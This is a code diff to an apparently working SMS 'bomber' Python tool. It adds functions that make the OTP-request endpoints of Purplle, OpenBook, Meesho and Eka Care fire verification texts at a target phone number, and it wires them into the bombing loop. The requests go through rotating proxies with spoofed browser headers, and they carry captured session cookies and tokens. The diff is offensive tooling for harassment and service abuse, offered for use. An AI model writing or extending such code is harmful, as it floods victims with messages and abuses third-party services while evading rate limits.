@@ -667,6 +667,117 @@ class Bomber:
         if(request.status_code == 400):
             return True
 
+    def purplle(self):
+
+        url = "https://www.purplle.com/api/account/authorization/send_otp"
+        querystring = {"phone": {self.user_mobile}}
+
+        payload = ""
+        headers = {
+            'cookie': "csrftoken=5e8da98d426f5dfbe51e27a1ee970d16; _autm30d=null; session_initiated=Direct; _tmpsess=1; __uzma=629eb69176aac8.71227885; __uzmb=1654568593; __uzmc=905391024687; __uzmd=1654568593; environment=prod; is_robot=false; client_ip=43.248.34.6; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJ5QmtjTDdQQnF4aUZrWk5OSUgiLCJtb2RlX2RldmljZSI6ImRlc2t0b3AiLCJtb2RlX2RldmljZV90eXBlIjoid2ViIiwiaWF0IjoxNjU0NTY4NTkzLCJleHAiOjE2NjIzNDQ1OTMsImF1ZCI6IndlYiIsImlzcyI6InRva2VubWljcm9zZXJ2aWNlIn0.37ogWye7izJR0L7CUML80JmEyrcwlkhKcsBbWO5npKA; visitorppl=yBkcL7PBqxiFkZNNIH; device_id=yBkcL7PBqxiFkZNNIH; listingVers=listingV1; generic_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJLSXdZY1Z2Yzgwdld2QmV1TUoxMjcwMDExNTgwMjA1ODY3IiwibW9kZV9kZXZpY2UiOiJkZXNrdG9wIiwibW9kZV9kZXZpY2VfdHlwZSI6IndlYiIsImlhdCI6MTU4NDA4NjYzOCwiZXhwIjoyNjkwNjQ3NTI0LCJhdWQiOiJ3ZWIiLCJpc3MiOiJ0b2tlbm1pY3Jvc2VydmljZSJ9.RdrqkTAPBDh0Qe-605a_dOYoXOOPcJe33f6tuMioKi8; generic_visitorppl=KIwYcVvc80vWvBeuMJ1270011580205867; is_webview=false; mode_device=desktop; referrer=; utm_source=Direct; utm_medium=; utm_campaign=; gclid=; pclid=; fbclid=; session_initiator=Direct; is_first_session=true; sessionCreatedTime=1654568594; isSessionDetails=true; sendSiteVisitOnNextPageView=true; session_id=2a8da1595af7d4c4efc1bea7af8207dd; _gcl_au=1.1.2061605430.1654568594; _ga=GA1.2.181404065.1654568594; _gid=GA1.2.2007181958.1654568594; g_state={\"i_p\":1654576187674,\"i_l\":1}; sessionExpiryTime=1654570791",
+            'authority': "www.purplle.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/x-www-form-urlencoded",
+            'device_id': "yBkcL7PBqxiFkZNNIH",
+            'dnt': "1",
+            'referer': "https://www.purplle.com/login?next=profile",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'token': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJ5QmtjTDdQQnF4aUZrWk5OSUgiLCJtb2RlX2RldmljZSI6ImRlc2t0b3AiLCJtb2RlX2RldmljZV90eXBlIjoid2ViIiwiaWF0IjoxNjU0NTY4NTkzLCJleHAiOjE2NjIzNDQ1OTMsImF1ZCI6IndlYiIsImlzcyI6InRva2VubWljcm9zZXJ2aWNlIn0.37ogWye7izJR0L7CUML80JmEyrcwlkhKcsBbWO5npKA",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36"
+        }
+        try:
+            request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def openBook(self):
+        url = "https://openbook-api.bankopen.co/mobile/users/register/otp"
+
+        payload = "{\"username\":"f'"{self.user_mobile}"'"}"
+        headers = {
+            'cookie': "Path=%2F",
+            'authority': "openbook-api.bankopen.co",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'dnt': "1",
+            'origin': "https://web.openbook.co",
+            'referer': "https://web.openbook.co/login?next=%2Fdashboard",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "cross-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-api-version': "3.1",
+            'x-client-type': "Web"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def meesho(self):
+        url = "https://meesho.com/api/v1/user/login/request-otp"
+
+        payload = "{\"phone_number\":"f'"{self.user_mobile}"'"}"
+        headers = {
+            'authority': "meesho.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'cookie': "tk1Clid=undefined; _gcl_au=1.1.1572189097.1654568888; _ga=GA1.1.332013402.1654568888; WZRK_G=a018931b38cf4be3ab2ebf2d73030589; _ga_64C11X856M=GS1.1.1654568888.1.1.1654568892.0; _ga_ZB97HR591S=GS1.1.1654568890.1.1.1654568892.58; WZRK_S_48K-65W-Z75Z=%7B%22p%22%3A2%2C%22s%22%3A1654568891%2C%22t%22%3A1654568897%7D; mp_60483c180bee99d71ee5c084d7bb9d20_mixpanel=%7B%22distinct_id%22%3A%20%221813bfda7fd879-05265f815683e5-4b657f5c-1fa400-1813bfda7fe9d0%22%2C%22%24device_id%22%3A%20%221813bfda7fd879-05265f815683e5-4b657f5c-1fa400-1813bfda7fe9d0%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22%24user_id%22%3A%20%221813bfda7fd879-05265f815683e5-4b657f5c-1fa400-1813bfda7fe9d0%22%2C%22Is%20Anonymous%22%3A%20%22True%22%2C%22Session%20ID%22%3A%20%224290e0b4-13cf-4d2a-a8a3-99830084%22%2C%22last%20event%20time%22%3A%201654568902060%7D",
+            'dnt': "1",
+            'meesho-iso-country-code': "IN",
+            'origin': "https://meesho.com",
+            'referer': "https://meesho.com/auth?redirect=https%3A%2F%2Fmeesho.com%2F&source=profile&entry=header&screen=HP",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def eka(self):
+        url = "https://auth.eka.care/auth/resend"
+
+        payload = "{\"mobile\":"f'"{self.user_mobile}"'"}"
+        headers = {
+            'authority': "auth.eka.care",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'client-id': "doc-web",
+            'content-type': "application/json",
+            'cookie': "_gcl_au=1.1.1355876739.1654569406; _ga=GA1.1.1936787513.1654569406; _ga_JKBK7MFNEV=GS1.1.1654569405.1.0.1654569411.0; _hjSessionUser_2591420=eyJpZCI6IjYxNWVkNmZjLTdkY2EtNWFhYy05NmQwLTMyNDljMzUxYTVhZCIsImNyZWF0ZWQiOjE2NTQ1Njk0MTE4MTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2591420=eyJpZCI6ImUzYTdmYjUxLTI2MTItNGFjYy05ZjNkLTViYWQ3MmQ2YmNkMiIsImNyZWF0ZWQiOjE2NTQ1Njk0MTIwMzEsImluU2FtcGxlIjp0cnVlfQ==; crisp-client%2Fsession%2F4c30fe75-b57c-4156-a5e4-58295a7880cf=session_3f077a65-3f23-41a9-b123-1b177ae952f6; mp_8801fa535d97939e4b9c500e5f0ddec9_mixpanel=%7B%22distinct_id%22%3A%20%221813c05a54ef6-00c9610bf35c5e-15373079-1fa400-1813c05a54fd32%22%2C%22%24device_id%22%3A%20%221813c05a54ef6-00c9610bf35c5e-15373079-1fa400-1813c05a54fd32%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fdr.eka.care%2Fapp%22%2C%22%24initial_referring_domain%22%3A%20%22dr.eka.care%22%7D",
+            'dnt': "1",
+            'origin': "https://dr.eka.care",
+            'referer': "https://dr.eka.care/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
     def startBombing(self):
         if(self._checkinternet()):
             counter = 0
@@ -724,6 +835,14 @@ class Bomber:
                 if self.kreditBee():
                     counter += 1
                 if self.dMart():
+                    counter += 1
+                if self.purplle():
+                    counter += 1
+                if self.openBook():
+                    counter += 1
+                if self.eka():
+                    counter += 1
+                if self.meesho():
                     counter += 1
 
                 if(counter >= self.number_of_messege):
